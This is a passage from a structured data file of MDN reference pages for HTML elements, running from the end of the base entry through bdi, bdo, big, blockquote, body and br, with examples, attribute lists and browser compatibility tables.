reaches a character that closes the attribute.\n\n### Open Graph\n\n[Open Graph](https://ogp.me/) tags do not acknowledge `<base>`, and should always have full absolute URLs. For example:\n\nhtml\n\n```\n<meta property=\"og:image\" content=\"https://example.com/thumbnail.jpg\" />\n```\n\n## Examples\n\nhtml\n\n```\n<base href=\"https://www.example.com/\" />\n<base target=\"_blank\" />\n<base target=\"_top\" href=\"https://example.com/\" />\n```\n\n## Technical summary\n\n|                                             |                                                                                               |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | Metadata content.                                                                             |\n| Permitted content                           | None; it is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element). |\n| Tag omission                                | Must have a start tag and must not have an end tag.                                           |\n| Permitted parents                           | A [`<head>`](head) that doesn't contain another `<base>` element.                             |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)           |\n| Permitted ARIA roles                        | No `role` permitted                                                                           |\n| DOM interface                               | [`HTMLBaseElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLBaseElement)         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `base`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `href`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `target` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base)"
- name: bdi
  summary: The <bdi> HTML element tells the browser's bidirectional algorithm to treat the text it contains in isolation from its surrounding text
  description: "# \\<bdi\\>: The Bidirectional Isolate element\n\nThe `<bdi>` [HTML](../index) element tells the browser's bidirectional algorithm to treat the text it contains in isolation from its surrounding text. It's particularly useful when a website dynamically inserts some text and doesn't know the directionality of the text being inserted.\n\n## Try it\n\n#### HTML Demo: \\<bdi\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>World wrestling championships</h1>\n\n    <ul>\n      <li><bdi class=\"name\">Evil Steven</bdi>: 1st place</li>\n      <li><bdi class=\"name\">François fatale</bdi>: 2nd place</li>\n      <li><span class=\"name\">سما</span>: 3rd place</li>\n      <li><bdi class=\"name\">الرجل القوي إيان</bdi>: 4th place</li>\n      <li><span class=\"name\" dir=\"auto\">سما</span>: 5th place</li>\n    </ul>\n\n    html {\n      font-family: sans-serif;\n    }\n\n    /* stylelint-disable-next-line block-no-empty */\n    bdi {\n    }\n\n    .name {\n      color: red;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nBidirectional text is text that may contain both sequences of characters that are arranged left-to-right (LTR) and sequences of characters that are arranged right-to-left (RTL), such as an Arabic quotation embedded in an English string. Browsers implement the [Unicode Bidirectional Algorithm](https://www.w3.org/International/articles/inline-bidi-markup/uba-basics) to handle this. In this algorithm, characters are given an implicit directionality: for example, Latin characters are treated as LTR while Arabic characters are treated as RTL. Some other characters (such as spaces and some punctuation) are treated as neutral and are assigned directionality based on that of their surrounding characters.\n\nUsually, the bidirectional algorithm will do the right thing without the author having to provide any special markup but, occasionally, the algorithm needs help. That's where `<bdi>` comes in.\n\nThe `<bdi>` element is used to wrap a span of text and instructs the bidirectional algorithm to treat this text in isolation from its surroundings. This works in two ways:\n\n- The directionality of text embedded in `<bdi>` *does not influence* the directionality of the surrounding text.\n- The directionality of text embedded in `<bdi>` *is not influenced by* the directionality of the surrounding text.\n\nFor example, consider some text like:\n\n```\nEMBEDDED-TEXT - 1st place\n```\n\nIf `EMBEDDED-TEXT` is LTR, this works fine. But if `EMBEDDED-TEXT` is RTL, then `- 1` will be treated as RTL text (because it consists of neutral and weak characters). The result will be garbled:\n\n```\n1 - EMBEDDED-TEXTst place\n```\n\nIf you know the directionality of `EMBEDDED-TEXT` in advance, you can fix this problem by wrapping `EMBEDDED-TEXT` in a [`<span>`](span) with the [`dir`](../global_attributes#dir) attribute set to the known directionality. But if you don't know the directionality - for example, because `EMBEDDED-TEXT` is being read from a database or entered by the user - you should use `<bdi>` to prevent the directionality of `EMBEDDED-TEXT` from affecting its surroundings.\n\nThough the same visual effect can be achieved using the CSS rule [`unicode-bidi: isolate`](https://developer.mozilla.org/en-US/docs/Web/CSS/unicode-bidi) on a [`<span>`](span) or another text-formatting element, HTML authors should not use this approach because it is not semantic and browsers are allowed to ignore CSS styling.\n\nEmbedding the characters in `<span dir=\"auto\">` has the same effect as using `<bdi>`, but its semantics are less clear.\n\n## Attributes\n\nLike all other HTML elements, this element supports the [global attributes](../global_attributes), except that the [`dir`](../global_attributes#dir) attribute behaves differently than normal: it defaults to `auto`, meaning its value is never inherited from the parent element. This means that unless you specify a value of either `rtl` or `ltr` for `dir`, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) will determine the correct directionality to use based on the contents of the `<bdi>`.\n\n## Examples\n\n### No bdi with only LTR\n\nThis example lists the winners of a competition using [`<span>`](span) elements only. When the names only contain LTR text the results look fine:\n\nhtml\n\n```\n<ul>\n  <li><span class=\"name\">Henrietta Boffin</span> - 1st place</li>\n  <li><span class=\"name\">Jerry Cruncher</span> - 2nd place</li>\n</ul>\n```\n\n### No bdi with RTL text\n\nThis example lists the winners of a competition using [`<span>`](span) elements only, and one of the winners has a name consisting of RTL text. In this case the \"`- 1`\", which consists of characters with neutral or weak directionality, will adopt the directionality of the RTL text, and the result will be garbled:\n\nhtml\n\n```\n<ul>\n  <li><span class=\"name\">اَلأَعْشَى</span> - 1st place</li>\n  <li><span class=\"name\">Jerry Cruncher</span> - 2nd place</li>\n</ul>\n```\n\n### Using bdi with LTR and RTL text\n\nThis example lists the winners of a competition using `<bdi>` elements. These elements instruct the browser to treat the name in isolation from its embedding context, so the example output is properly ordered:\n\nhtml\n\n```\n<ul>\n  <li><bdi class=\"name\">اَلأَعْشَى</bdi> - 1st place</li>\n  <li><bdi class=\"name\">Jerry Cruncher</bdi> - 2nd place</li>\n</ul>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role)                                   |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `bdi` | 16      | 79   | 10      | 15    | 6      | 18             | 10                  | 14            | 6             | 1.0              | ≤37             |     |\n\n## See also\n\n- [Inline markup and bidirectional text in HTML](https://www.w3.org/International/articles/inline-bidi-markup/)\n- [Unicode Bidirectional Algorithm basics](https://www.w3.org/International/articles/inline-bidi-markup/uba-basics)\n- [Localization](https://developer.mozilla.org/en-US/docs/Glossary/Localization)\n- Related HTML element: [`<bdo>`](bdo)\n- Related CSS properties: [`direction`](https://developer.mozilla.org/en-US/docs/Web/CSS/direction), [`unicode-bidi`](https://developer.mozilla.org/en-US/docs/Web/CSS/unicode-bidi)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/bdi](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/bdi)"
- name: bdo
  summary: The <bdo> HTML element overrides the current directionality of text, so that the text within is rendered in a different direction
  description: "# \\<bdo\\>: The Bidirectional Text Override element\n\nThe `<bdo>` [HTML](../index) element overrides the current directionality of text, so that the text within is rendered in a different direction.\n\n## Try it\n\n#### HTML Demo: \\<bdo\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>Famous seaside songs</h1>\n\n    <p>The English song \"Oh I do like to be beside the seaside\"</p>\n\n    <p>Looks like this in Hebrew: <span dir=\"rtl\">אה, אני אוהב להיות ליד חוף הים</span></p>\n\n    <p>In the computer's memory, this is stored as <bdo dir=\"ltr\">אה, אני אוהב להיות ליד חוף הים</bdo></p>\n\n    html {\n      font-family: sans-serif;\n    }\n\n    /* stylelint-disable-next-line block-no-empty */\n    bdo {\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe text's characters are drawn from the starting point in the given direction; the individual characters' orientation is not affected (so characters don't get drawn backward, for example).\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`dir`](#dir)  \nThe direction in which text should be rendered in this element's contents. Possible values are:\n\n- `ltr`: Indicates that the text should go in a left-to-right direction.\n- `rtl`: Indicates that the text should go in a right-to-left direction.\n\n## Examples\n\nhtml\n\n```\n<!-- Switch text direction -->\n<p>This text will go left to right.</p>\n<p><bdo dir=\"rtl\">This text will go right to left.</bdo></p>\n```\n\n### Result\n\n## Notes\n\nThe HTML 4 specification did not specify events for this element; they were added in XHTML. This is most likely an oversight.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content.                                                                                                                               |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                                                                            |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role)                                                                                                                                                                 |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                                             |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) Up to Gecko 1.9.2 (Firefox 4) inclusive, Firefox implements the [`HTMLSpanElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSpanElement) interface for this element. |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `bdo` | ≤15     | 12   | 10      | ≤15   | ≤4     | 18             | 10                  | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- Related HTML element: [`<bdi>`](bdi)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/bdo](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/bdo)"
- name: bgcolor (attribute)
  summary: Background color of the element
  belongs_to: Attributes
  description: |-
    `bgcolor`

    [`<body>`](element/body), [`<col>`](element/col), [`<colgroup>`](element/colgroup), [`<marquee>`](element/marquee), [`<table>`](element/table), [`<tbody>`](element/tbody), [`<tfoot>`](element/tfoot), [`<td>`](element/td), [`<th>`](element/th), [`<tr>`](element/tr)

    Background color of the element.

    **Note:** This is a legacy attribute. Please use the CSS [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) property instead.
- name: big
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<big\\>: The Bigger Text element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<big>` [HTML](../index) deprecated element renders the enclosed text at a font size one level larger than the surrounding text (`medium` becomes `large`, for example). The size is capped at the browser's maximum permitted font size.\n\n**Warning:** This element has been removed from the specification and shouldn't be used anymore. Use the CSS [`font-size`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-size) property to adjust the font size.\n\n## Attributes\n\nThis element has no other attributes than the [global attributes](../global_attributes), common to all elements.\n\n## Examples\n\nHere we see examples showing the use of `<big>` followed by an example showing how to accomplish the same results using modern CSS syntax instead.\n\n### Using big\n\nThis example uses the obsolete `<big>` element to increase the size of some text.\n\n#### HTML\n\nhtml\n\n```\n<p>\n  This is the first sentence.\n  <big>This whole sentence is in bigger letters.</big>\n</p>\n```\n\n#### Result\n\n### Using CSS `font-size`\n\nThis example uses the CSS [`font-size`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-size) property to increase the font size by one level.\n\n#### CSS\n\ncss\n\n```\n.bigger {\n  font-size: larger;\n}\n```\n\n#### HTML\n\nhtml\n\n```\n<p>\n  This is the first sentence.\n  <span class=\"bigger\">This whole sentence is in bigger letters.</span>\n</p>\n```\n\n#### Result\n\n## DOM interface\n\nThis element implements the [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) interface.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `big` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- CSS: [`font-size`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-size), [`font`](https://developer.mozilla.org/en-US/docs/Web/CSS/font)\n- HTML: [`<small>`](small), [`<font>`](font), [`<style>`](style)\n- HTML 4.01 Specification: [Font Styles](https://www.w3.org/TR/html4/present/graphics.html#h-15.2)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/big](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/big)"
- name: blockquote
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<blockquote\\>: The Block Quotation element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fblockquote&level=high)\n\nThe `<blockquote>` [HTML](../index) element indicates that the enclosed text is an extended quotation. Usually, this is rendered visually by indentation (see [Notes](#usage_notes) for how to change it). A URL for the source of the quotation may be given using the `cite` attribute, while a text representation of the source can be given using the [`<cite>`](cite) element.\n\n## Try it\n\n#### HTML Demo: \\<blockquote\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <div>\n      <blockquote cite=\"https://www.huxley.net/bnw/four.html\">\n        <p>Words can be like X-rays, if you use them properly—they’ll go through anything. You read and you’re pierced.</p>\n      </blockquote>\n      <p>—Aldous Huxley, <cite>Brave New World</cite></p>\n    </div>\n\n    div:has(> blockquote) {\n      background-color: #ededed;\n      margin: 10px auto;\n      padding: 15px;\n      border-radius: 5px;\n    }\n\n    blockquote p::before {\n      content: '\\201C';\n    }\n\n    blockquote p::after {\n      content: '\\201D';\n    }\n\n    blockquote + p {\n      text-align: right;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`cite`](#cite)  \nA URL that designates a source document or message for the information quoted. This attribute is intended to point to information explaining the context or the reference for the quote.\n\n## Usage notes\n\nAccording to the specification, attribution for the quotation, if any, must be placed outside the `<blockquote>` element.\n\nTo change the indentation applied to the quoted text, use the [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) [`margin-left`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-left) and/or [`margin-right`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-right) properties, or the [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) shorthand property.\n\nTo include shorter quotes inline rather than in a separate block, use the [`<q>`](q) (Quotation) element.\n\n## Examples\n\nThis example demonstrates the use of the `<blockquote>` element to quote a passage from [RFC 1149](https://datatracker.ietf.org/doc/html/rfc1149), *A Standard for the Transmission of IP Datagrams on Avian Carriers*.\n\nhtml\n\n```\n<blockquote cite=\"https://datatracker.ietf.org/doc/html/rfc1149\">\n  <p>\n    Avian carriers can provide high delay, low throughput, and low altitude\n    service. The connection topology is limited to a single point-to-point path\n    for each carrier, used with standard carriers, but many carriers can be used\n    without significant interference with each other, outside early spring. This\n    is because of the 3D ether space available to the carriers, in contrast to\n    the 1D ether used by IEEE802.3. The carriers have an intrinsic collision\n    avoidance system, which increases availability.\n  </p>\n</blockquote>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                               |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), sectioning root, palpable content.                                                        |\n| Permitted content                           | [Flow content](../content_categories#flow_content).                                                                                           |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                         |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                                  |\n| Implicit ARIA role                          | [`blockquote`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents) |\n| Permitted ARIA roles                        | Any                                                                                                                                           |\n| DOM interface                               | [`HTMLQuoteElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLQuoteElement)                                                       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|              | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|              | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `blockquote` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `cite`       | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- The [`<q>`](q) element for inline quotations.\n- The [`<cite>`](cite) element for source citations.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/blockquote](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/blockquote)"
- name: body
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<body\\>: The Document Body element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fbody&level=high)\n\nThe `<body>` [HTML](../index) element represents the content of an HTML document. There can be only one `<body>` element in a document.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`alink`](#alink) Deprecated  \nColor of text for hyperlinks when selected. **Do not use this attribute! Use the CSS [`color`](https://developer.mozilla.org/en-US/docs/Web/CSS/color) property in conjunction with the [`:active`](https://developer.mozilla.org/en-US/docs/Web/CSS/:active) pseudo-class instead.**\n\n[`background`](#background) Deprecated  \nURI of an image to use as a background. **Do not use this attribute! Use the CSS [`background`](https://developer.mozilla.org/en-US/docs/Web/CSS/background) property on the element instead.**\n\n[`bgcolor`](#bgcolor) Deprecated  \nBackground color for the document. **Do not use this attribute! Use the CSS [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) property on the element instead.**\n\n[`bottommargin`](#bottommargin) Deprecated  \nThe margin of the bottom of the body. **Do not use this attribute! Use the CSS [`margin-bottom`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-bottom) property on the element instead.**\n\n[`leftmargin`](#leftmargin) Deprecated  \nThe margin of the left of the body. **Do not use this attribute! Use the CSS [`margin-left`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-left) property on the element instead.**\n\n[`link`](#link) Deprecated  \nColor of text for unvisited hypertext links. **Do not use this attribute! Use the CSS [`color`](https://developer.mozilla.org/en-US/docs/Web/CSS/color) property in conjunction with the [`:link`](https://developer.mozilla.org/en-US/docs/Web/CSS/:link) pseudo-class instead.**\n\n[`onafterprint`](#onafterprint)  \nFunction to call after the user has printed the document.\n\n[`onbeforeprint`](#onbeforeprint)  \nFunction to call when the user requests printing of the document.\n\n[`onbeforeunload`](#onbeforeunload)  \nFunction to call when the document is about to be unloaded.\n\n[`onblur`](#onblur)  \nFunction to call when the document loses focus.\n\n[`onerror`](#onerror)  \nFunction to call when the document fails to load properly.\n\n[`onfocus`](#onfocus)  \nFunction to call when the document receives focus.\n\n[`onhashchange`](#onhashchange)  \nFunction to call when the fragment identifier part (starting with the hash (`'#'`) character) of the document's current address has changed.\n\n[`onlanguagechange`](#onlanguagechange)  \nFunction to call when the preferred languages changed.\n\n[`onload`](#onload)  \nFunction to call when the document has finished loading.\n\n[`onmessage`](#onmessage)  \nFunction to call when the document has received a message.\n\n[`onoffline`](#onoffline)  \nFunction to call when network communication has failed.\n\n[`ononline`](#ononline)  \nFunction to call when network communication has been restored.\n\n[`onpopstate`](#onpopstate)  \nFunction to call when the user has navigated session history.\n\n[`onresize`](#onresize)  \nFunction to call when the document has been resized.\n\n[`onstorage`](#onstorage)  \nFunction to call when the storage area has changed.\n\n[`onunload`](#onunload)  \nFunction to call when the document is going away.\n\n[`rightmargin`](#rightmargin) Deprecated  \nThe margin of the right of the body. **Do not use this attribute! Use the CSS [`margin-right`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-right) property on the element instead.**\n\n[`text`](#text) Deprecated  \nForeground color of text. **Do not use this attribute! Use CSS [`color`](https://developer.mozilla.org/en-US/docs/Web/CSS/color) property on the element instead.**\n\n[`topmargin`](#topmargin) Deprecated  \nThe margin of the top of the body. **Do not use this attribute! Use the CSS [`margin-top`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-top) property on the element instead.**\n\n[`vlink`](#vlink) Deprecated  \nColor of text for visited hypertext links. **Do not use this attribute! Use the CSS [`color`](https://developer.mozilla.org/en-US/docs/Web/CSS/color) property in conjunction with the [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited) pseudo-class instead.**\n\n## Examples\n\nhtml\n\n```\n<html lang=\"en\">\n  <head>\n    <title>Document title</title>\n  </head>\n  <body>\n    <p>\n      The <code>&lt;body&gt;</code> HTML element represents the content of an\n      HTML document. There can be only one <code>&lt;body&gt;</code> element in\n      a document.\n    </p>\n  </body>\n</html>\n```\n\n### Result\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<html>`](html)\n- [`<head>`](head)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/body](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/body)"
- name: border (attribute)
  summary: The border width
  belongs_to: Attributes
  description: |-
    `border`

    [`<img>`](element/img), [`<object>`](element/object), [`<table>`](element/table)

    The border width.

    **Note:** This is a legacy attribute. Please use the CSS [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border) property instead.
- name: br
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<br\\>: The Line Break element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fbr&level=high)\n\nThe `<br>` [HTML](../index) element produces a line break in text (carriage-return). It is useful for writing a poem or an address, where the division of lines is significant.\n\n## Try it\n\n#### HTML Demo: \\<br\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      O’er all the hilltops<br />\n      Is quiet now,<br />\n      In all the treetops<br />\n      Hearest thou<br />\n      Hardly a breath;<br />\n      The birds are asleep in the trees:<br />\n      Wait, soon like these<br />\n      Thou too shalt rest.\n    </p>\n\n    p {\n      font-size: 1rem;\n      font-family: sans-serif;\n      margin: 20px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nAs you can see from the above example, a `<br>` element is included at each point where we want the text to break. The text after the `<br>` begins again at the start of the next line of the text block.\n\n**Note:** Do not use `<br>` to create margins between paragraphs; wrap them in [`<p>`](p) elements and use the [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) property to control their size.\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n### Deprecated attributes\n\n[`clear`](#clear) Deprecated  \nIndicates where to begin the next line after the break.\n\n## Styling with CSS\n\nThe `<br>` element has a single, well-defined purpose — to create a line break in a block of text. As such, it has no dimensions or visual output of its own, and there is very little you can do to style it.\n\nYou can set a [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) on `<br>` elements themselves to increase the spacing between the lines of text in the block, but this is a bad practice — you should use the [`line-height`](https://developer.mozilla.org/en-US/docs/Web/CSS/line-height) property that was designed for that purpose.\n\n## Accessibility\n\nCreating separate paragraphs of text using `<br>` is not only bad practice, it is problematic for people who navigate with the aid of screen reading technology. Screen readers may announce the presence of the element, but not any content contained within `<br>`s. This can be a confusing and frustrating experience for the person using the screen reader.\n\nUse `<p>` elements, and use CSS properties like [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) to control their spacing.\n\n## Examples\n\n### Simple br\n\nIn the following example we use `<br>` elements to create line breaks between the different lines of a postal address:\n\nhtml\n\n```\nMozilla<br />\n331 E. Evelyn Avenue<br />\nMountain View, CA<br />\n94041<br />\nUSA<br />\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                      |\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content).                                                                                      |\n| Permitted content                           | None; it is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element).                                                                                                        |\n| Tag omission                                | Must have a start tag and must not have an end tag. In XHTML documents, write this element as `<br />`.                                                                                              |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                 |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                  |\n| Permitted ARIA roles                        | [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) |\n| DOM interface                               | [`HTMLBRElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLBRElement)                                                                                                                    |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `br`    | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             